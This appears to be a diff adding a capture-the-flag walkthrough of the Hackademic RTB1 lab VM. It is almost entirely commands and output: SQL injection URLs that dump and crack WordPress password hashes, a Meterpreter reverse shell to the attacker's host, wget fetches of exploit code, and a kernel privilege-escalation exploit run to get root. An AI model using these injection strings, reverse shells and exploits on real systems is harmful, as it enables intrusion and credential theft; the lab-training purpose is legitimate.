@@ -1,0 +1,272 @@
+http://192.168.0.101/Hackademic_RTB1/?cat=1
+
+http://192.168.0.101/Hackademic_RTB1/?cat=1'
+
+http://192.168.0.101/Hackademic_RTB1/?cat=1 order by 1
+http://192.168.0.101/Hackademic_RTB1/?cat=1 order by 2
+.
+.
+http://192.168.0.101/Hackademic_RTB1/?cat=1 order by 5
+http://192.168.0.101/Hackademic_RTB1/?cat=1 order by 6 XXXXXXXXX
+
+http://192.168.0.101/Hackademic_RTB1/?cat=1 order by 5
+
+after verifying 5 columns from which webapp is fetching data, we need to find vuln column for performing injection and getting output
+
+http://192.168.0.101/Hackademic_RTB1/?cat=0 UNION SELECT 1,2,3,4,5
+
+http://192.168.0.101/Hackademic_RTB1/?cat=0 UNION SELECT 1,database(),3,4,5
+
+http://192.168.0.101/Hackademic_RTB1/?cat=0 UNION SELECT 1,group_concat(table_name),3,4,5 from information_schema.tables where table_schema=database()
+
+wp_users
+
+http://192.168.0.101/Hackademic_RTB1/?cat=0 UNION SELECT 1,group_concat(column_name),3,4,5 from information_schema.columns where table_name='wp_users'
+
+wp_users == 0x77705f7573657273
+
+http://192.168.0.101/Hackademic_RTB1/?cat=0 UNION SELECT 1,group_concat(column_name),3,4,5 from information_schema.columns where table_name=0x77705f7573657273
+
+ID,user_login,user_pass,user_firstname,user_lastname,user_nickname,
+user_nicename,user_icq,user_email,user_url,user_ip,user_domain,
+user_browser,user_registered,user_level,user_aim,user_msn,user_yim,
+user_idmode,user_activation_key,user_status,user_description
+
+http://192.168.0.101/Hackademic_RTB1/?cat=0 UNION SELECT 1,group_concat(ID,user_login,user_pass),3,4,5 from wp_users
+
+1NickJames21232f297a57a5a743894a0e4a801fc3,
+2JohnSmithb986448f0bb9e5e124ca91d3d650f52c,3GeorgeMiller7cbb3252ba6b7e9c422fac5334d22054,
+4TonyBlacka6e514f9486b83cb53d8d932f9a04292,
+5JasonKonnors8601f6e1028a8e8a966f6c33fcd9aec4,
+6MaxBucky50484c19f1afdaf3841a0d821ed393d2
+
+http://192.168.0.101/Hackademic_RTB1/?cat=0 UNION SELECT 1,group_concat(ID,0x3a,user_login,0x3a,user_pass),3,4,5 from wp_users
+
+1:NickJames:21232f297a57a5a743894a0e4a801fc3:admin,
+2:JohnSmith:b986448f0bb9e5e124ca91d3d650f52c:PUPPIES,
+3:GeorgeMiller:7cbb3252ba6b7e9c422fac5334d22054:q1w2e3,
+4:TonyBlack:a6e514f9486b83cb53d8d932f9a04292:napoleon,
+5:JasonKonnors:8601f6e1028a8e8a966f6c33fcd9aec4:maxwell,
+6:MaxBucky:50484c19f1afdaf3841a0d821ed393d2:kernel
+
+
+root@kali:~# msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.0.121 LPORT=443 -f raw -o /root/Desktop/test.php
+[-] No platform was selected, choosing Msf::Module::Platform::PHP from the payload
+[-] No arch selected, selecting arch: php from the payload
+No encoder or badchars specified, outputting raw payload
+Payload size: 1113 bytes
+Saved as: /root/Desktop/test.php
+root@kali:~# service postgresql start
+root@kali:~# msfconsole -q
+msf5 > use multi/handler
+msf5 exploit(multi/handler) > set payload php/meterpreter/reverse_tcp
+payload => php/meterpreter/reverse_tcp
+msf5 exploit(multi/handler) > set LHOST 192.168.0.121
+LHOST => 192.168.0.121
+msf5 exploit(multi/handler) > set LPORT 443
+LPORT => 443
+msf5 exploit(multi/handler) > exploit -j
+[*] Exploit running as background job 0.
+[*] Exploit completed, but no session was created.
+
+[*] Started reverse TCP handler on 192.168.0.121:443 
+msf5 exploit(multi/handler) > [*] Sending stage (38288 bytes) to 192.168.0.101
+[*] Meterpreter session 1 opened (192.168.0.121:443 -> 192.168.0.101:51864) at 2019-11-13 19:05:20 +0530
+
+msf5 exploit(multi/handler) > sessions
+
+Active sessions
+===============
+
+  Id  Name  Type                   Information                Connection
+  --  ----  ----                   -----------                ----------
+  1         meterpreter php/linux  root (0) @ HackademicRTB1  192.168.0.121:443 -> 192.168.0.101:51864 (192.168.0.101)
+
+msf5 exploit(multi/handler) > sessions -i 1
+[*] Starting interaction with 1...
+
+meterpreter > getuid
+Server username: root (0)
+meterpreter > shell
+Process 3551 created.
+Channel 0 created.
+locate Key.txt
+which python
+/usr/bin/python
+python -c 'import pty; pty.spawn("/bin/bash")'
+bash-4.0$ pwd
+pwd
+/var/www/html/Hackademic_RTB1/wp-admin
+bash-4.0$ cd /
+cd /
+bash-4.0$ ls -l 
+ls -l
+total 98
+dr-xr-xr-x   2 root root  4096 Jan  7  2011 bin
+dr-xr-xr-x   5 root root  1024 Nov  9  2009 boot
+drwxr-xr-x  18 root root  3560 Nov 13 14:33 dev
+drwxr-xr-x 108 root root 12288 Nov 13 14:33 etc
+drwxr-xr-x   3 root root  4096 Jan  7  2011 home
+dr-xr-xr-x  16 root root 12288 Jan  9  2011 lib
+drwx------   2 root root 16384 Nov  9  2009 lost+found
+drwxr-xr-x   2 root root  4096 Jan  9  2011 media
+drwxr-xr-x   2 root root  4096 Jan  7  2011 mnt
+drwxr-xr-x   2 root root  4096 Aug 25  2009 opt
+dr-xr-xr-x 121 root root     0 Nov 13 14:33 proc
+dr-xr-x---  15 root root  4096 Jan  9  2011 root
+dr-xr-xr-x   2 root root 12288 Jan  7  2011 sbin
+drwxr-xr-x   3 root root  4096 Nov  9  2009 selinux
+drwxr-xr-x   2 root root  4096 Aug 25  2009 srv
+drwxr-xr-x  12 root root     0 Nov 13 14:33 sys
+drwxrwxrwt   6 root root  4096 Nov 13 15:34 tmp
+drwxr-xr-x  13 root root  4096 Nov  9  2009 usr
+drwxr-xr-x  20 root root  4096 Nov  9  2009 var
+bash-4.0$ cd /root
+cd /root
+bash: cd: /root: Permission denied
+bash-4.0$ whoami
+whoami
+apache
+bash-4.0$ uname -a
+uname -a
+Linux HackademicRTB1 2.6.31.5-127.fc12.i686 #1 SMP Sat Nov 7 21:41:45 EST 2009 i686 i686 i386 GNU/Linux
+bash-4.0$ which gcc
+which gcc
+/usr/bin/gcc
+bash-4.0$ pwd 
+pwd
+/
+bash-4.0$ cd /tmp 
+cd /tmp
+bash-4.0$ pwd
+pwd
+/tmp
+bash-4.0$ wget 192.168.0.121/test1
+wget 192.168.0.121/test1
+--2019-11-13 15:45:32--  http://192.168.0.121/test1
+Connecting to 192.168.0.121:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 18200 (18K)
+Saving to: `test1'
+
+100%[======================================>] 18,200      --.-K/s   in 0s      
+
+2019-11-13 15:45:32 (244 MB/s) - `test1' saved [18200/18200]
+
+bash-4.0$ ls -l 
+ls -l
+total 28
+drwx------ 2 gdm    gdm     4096 Nov 13 14:33 orbit-gdm
+drwx------ 2 gdm    gdm     4096 Nov 13 14:33 pulse-PKdhtXMmr18n
+-rw-r--r-- 1 apache apache 18200 Nov 13 15:44 test1
+bash-4.0$ chmod 777 test1	
+chmod 777 test1
+bash-4.0$ ./test1
+./test1
+bash: ./test1: cannot execute binary file
+bash-4.0$ wget 192.168.0.121/15285.c
+wget 192.168.0.121/15285.c
+--2019-11-13 15:46:24--  http://192.168.0.121/15285.c
+Connecting to 192.168.0.121:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 7155 (7.0K) [text/x-csrc]
+Saving to: `15285.c'
+
+100%[======================================>] 7,155       --.-K/s   in 0s      
+
+2019-11-13 15:46:24 (249 MB/s) - `15285.c' saved [7155/7155]
+
+bash-4.0$ ls -la
+ls -la
+total 56
+drwxrwxrwt  6 root   root    4096 Nov 13 15:46 .
+dr-xr-xr-x 22 root   root    4096 Nov 13 14:33 ..
+drwxrwxrwt  2 root   root    4096 Nov 13 14:33 .ICE-unix
+-r--r--r--  1 root   root      11 Nov 13 14:33 .X0-lock
+drwxrwxrwt  2 root   root    4096 Nov 13 14:33 .X11-unix
+-rw-r--r--  1 apache apache  7155 Nov 13 15:46 15285.c
+drwx------  2 gdm    gdm     4096 Nov 13 14:33 orbit-gdm
+drwx------  2 gdm    gdm     4096 Nov 13 14:33 pulse-PKdhtXMmr18n
+-rwxrwxrwx  1 apache apache 18200 Nov 13 15:44 test1
+bash-4.0$ gcc 15285.c -o test2
+gcc 15285.c -o test2
+bash-4.0$ ls -l
+ls -l
+total 48
+-rw-r--r-- 1 apache apache  7155 Nov 13 15:46 15285.c
+drwx------ 2 gdm    gdm     4096 Nov 13 14:33 orbit-gdm
+drwx------ 2 gdm    gdm     4096 Nov 13 14:33 pulse-PKdhtXMmr18n
+-rwxrwxrwx 1 apache apache 18200 Nov 13 15:44 test1
+-rwxr-xr-x 1 apache apache 10019 Nov 13 15:46 test2
+bash-4.0$ ./test2
+./test2
+[*] Linux kernel >= 2.6.30 RDS socket exploit
+[*] by Dan Rosenberg
+[*] Resolving kernel addresses...
+ [+] Resolved security_ops to 0xc0aa19ac
+ [+] Resolved default_security_ops to 0xc0955c6c
+ [+] Resolved cap_ptrace_traceme to 0xc055d9d7
+ [+] Resolved commit_creds to 0xc044e5f1
+ [+] Resolved prepare_kernel_cred to 0xc044e452
+[*] Overwriting security ops...
+[*] Overwriting function pointer...
+[*] Triggering payload...
+[*] Restoring function pointer...
+[*] Got root!
+sh-4.0# id
+id
+uid=0(root) gid=0(root)
+sh-4.0# cd /    
+cd /
+sh-4.0# ls -l
+ls -l
+total 98
+dr-xr-xr-x.   2 root root  4096 Jan  7  2011 bin
+dr-xr-xr-x.   5 root root  1024 Nov  9  2009 boot
+drwxr-xr-x   18 root root  3560 Nov 13 14:33 dev
+drwxr-xr-x. 108 root root 12288 Nov 13 14:33 etc
+drwxr-xr-x.   3 root root  4096 Jan  7  2011 home
+dr-xr-xr-x.  16 root root 12288 Jan  9  2011 lib
+drwx------.   2 root root 16384 Nov  9  2009 lost+found
+drwxr-xr-x.   2 root root  4096 Jan  9  2011 media
+drwxr-xr-x.   2 root root  4096 Jan  7  2011 mnt
+drwxr-xr-x.   2 root root  4096 Aug 25  2009 opt
+dr-xr-xr-x  128 root root     0 Nov 13 14:33 proc
+dr-xr-x---.  15 root root  4096 Jan  9  2011 root
+dr-xr-xr-x.   2 root root 12288 Jan  7  2011 sbin
+drwxr-xr-x.   3 root root  4096 Nov  9  2009 selinux
+drwxr-xr-x.   2 root root  4096 Aug 25  2009 srv
+drwxr-xr-x   12 root root     0 Nov 13 14:33 sys
+drwxrwxrwt.   6 root root  4096 Nov 13 15:46 tmp
+drwxr-xr-x.  13 root root  4096 Nov  9  2009 usr
+drwxr-xr-x.  20 root root  4096 Nov  9  2009 var
+sh-4.0# cd /root
+cd /root
+sh-4.0# ls -l
+ls -l
+total 16
+drwxr-xr-x. 2 root root 4096 Jan  7  2011 Desktop
+-rw-------. 1 root root 1101 Jan  7  2011 anaconda-ks.cfg
+-rw-r--r--  1 root root  223 Jan  8  2011 key.txt
+-rw-r--r--  1 root root  221 Jan  7  2011 key.txt~
+sh-4.0# cat key.txt
+cat key.txt
+Yeah!!
+You must be proud because you 've got the password to complete the First *Realistic* Hackademic Challenge (Hackademic.RTB1) :)
+
+$_d&jgQ>>ak\#b"(Hx"o<la_%
+
+Regards,
+mr.pr0n || p0wnbox.Team || 2011
+http://p0wnbox.com
+
+sh-4.0# 
+
+
+
+
+
+
+
+
+
